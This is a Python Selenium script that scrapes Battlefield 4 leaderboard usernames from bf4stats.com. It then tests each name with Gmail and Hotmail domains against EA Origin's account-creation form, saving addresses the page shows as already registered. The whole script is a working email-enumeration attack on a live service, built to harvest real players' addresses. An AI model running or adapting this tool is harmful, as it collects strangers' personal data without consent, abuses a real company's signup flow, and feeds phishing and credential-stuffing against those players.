#Program made by Ofir Bar, check readme doc for explanation.
originURL='https://signin.ea.com/p/web2/create?execution=e1263096384s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fredirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Foauth%252Flogin%253Fru%253D%252Fen-ie%252Fstore%252F%253Flogin%253DWyIiXQ%253D%253D%26locale%3Den_IE%26display%3Dweb2%252Fcreate%26response_type%3Dcode%26client_id%3Dlive.origin.com'
def findUsers():
	print("Battlefield 4 Origin real emails generator by Ofir Bar \n "+('*'*30))
	try:
		from selenium import webdriver
		from datetime import datetime
		import os,re
	except ImportError:
		print("Required libraries not installed , check that \n you have the following")
		print("libraries: selenium,os,re. you can install it via cmd with pip install")
		return
	try:
	        from datetime import datetime
	        timeStart=datetime.now()
	        print("Program stared at: "+str(timeStart))
	except:
		print("bla")
	try:
		browser=webdriver.Chrome()
	except:
		print('You may not have chromedriver.exe,don\'t worry,the program downloading it for you..')
		print('extact it & place it in python/Scripts. Note: to get full updated version check on the offical web')
		import urllib.request
		import shutil
		print("Downloading chromedriver.zip..." +'\n'+("*"*25))
		with urllib.request.urlopen('http://chromedriver.storage.googleapis.com/2.9/chromedriver_win32.zip') as response, open('chrome', 'wb') as out_file:
			shutil.copyfileobj(response, out_file)
			
	os.chdir(os.path.dirname(os.__file__))
	os.chdir('..')
	#changing to default python path,example: 'C:\\Users\\User\\AppData\\Local\\Programs\\Python\\Python35'
	while(True):
		saveShortcut=input("Save usernames database to current working directory? '"+os.getcwd()+"'  (y/n):  ")
		if saveShortcut=='y':
			#checks if directory already exists
			if os.path.isdir(r'./usernamesDatabase'):
				print('Database folder exists- switching to database directory..')
				os.chdir(r'usernamesDatabase')
				print('current working directory: '+os.getcwd())
				break
			else:
				print('Database folder not exist, creating folder..')
				os.makedirs(r'./usernamesDatabase')
				os.chdir(r'./usernamesDatabase')
				print('current working directory: '+os.getcwd())
				break
		elif saveShortcut=='n':
			saveTo=input("Enter file location to store usernames database: ")
			try:
				os.chdir(os.path.abspath(saveTo))
				print('Changed to path '+os.getcwd())
				break
			except FileNotFoundError:
				os.makedirs(os.path.abspath(saveTo))
				os.chdir(os.path.abspath(saveTo))
				print('Created directory and changed to path '+os.getcwd())
				break
		else:
			print ('Please enter valid char "y" or "n" ')

	index=int(input("Enter start index: (example: index 1000. index must be dividble by 50)"))
	count=int(input("Num of pages to extract: (each page = 49 usernames.)"))
	for runtimes in range(count):
		browser.get("http://bf4stats.com/leaderboards/pc_player_score?start="+str(index))
		def userName():
                        #function to extract only the usernames in each page.
			usernames=[]
			content = browser.find_element_by_css_selector('table.stable')
			findall=re.findall("\n.* ",content.text)
			for usernameText in findall:
				username=''
				for char in usernameText:
					if char==' ':
						break
					else:
						username=username+char
				usernames.append(username)
			#removing \n from usernames
			for username in usernames:
				username=username[1:]
			return usernames
		#assign a list containing all usernames
		usernames=userName()
		#adding each user to text file
		for user in usernames:
			try:
				with open ("usernamesDatabase.txt","a") as myfile:
                                        if user!='\n':
                                                myfile.write(user)
			except PermissionError:
				while(True):
					path=input("Access denied to "+os.getcwd()+"\n Choose different database path: ")
					try:
						os.chdir(path)
						break
					except:
						print('Coudln\'t locate "'+path+'" \n please try again: ')

		index=index+50
	print("*"*30+'\n \n generated usernames: '+str(count*49)+'\nTime spent: '+str(datetime.now()-timeStart)+'\n found a bug?: \n contact me: ofirbar5@gmail.com')
	#telling the user where we stored the usernames database text file.
	if saveShortcut=='y':
                print("Successfuly saved usernames database to current working directory: "+os.path.abspath(os.getcwd()))
                return os.path.abspath(os.getcwd())
	else:
                print("Successfuly saved usernames database to location: " + os.path.abspath(saveTo))
                return os.path.abspath(saveTo)

def originEmails(path):
	from selenium import webdriver
	import os
	from time import sleep
	try:
		os.chdir(path)
		print('Changed current working directory to: '+os.getcwd())
	except:
		print ('error')
		return
	browser=webdriver.Chrome()
	baseURL=browser.get(originURL)
	#databaseURL=input('Enter database text file path:(ex:C:/Users/User/Desktop/database.txt)  ')
	databaseURL=(os.getcwd()+r'/usernamesDatabase.txt')
	sleep(5)
	try:
                print(os.path.abspath(databaseURL))
                file=open(os.path.abspath(databaseURL),'r')
	except:
		print('Error: database URL not found.')
		return
	emailsDomain=['@gmail.com','@hotmail.com']
	#loop through each user in database
	for user in file:
		tempUsername=user
		print ('username:'+user,end='')
		#need to delete \n in every user before using tempUsername! dont forget, example: user\n@gmail.com --> user@gmail.com, to do it use slice [:-1]
		for domain in emailsDomain:
			emailForm=browser.find_element_by_id("email")
			btn=browser.find_element_by_id("btn-next")
			sleep(4)
			#submit username+email domain to origin register
			tempUsername=user[:-1]+domain
			sleep(5)
			emailForm.send_keys(tempUsername)
			btn.click()
			#VERY IMPORTANT: check to see if user exist / not.
			sleep(5)#sleep used to let new page load. i will change it later.
			content=browser.find_element_by_css_selector('label.origin-ux-textbox-label')
			if content.text != 'Public ID':
                                with open ("originMails.txt","a") as myfile:
                                        myfile.write(tempUsername)
                                        myfile.write('\n')
			browser.get(originURL)
			sleep(2)
		print('*'*30)
	return
#running:
path=findUsers()
originEmails(path)
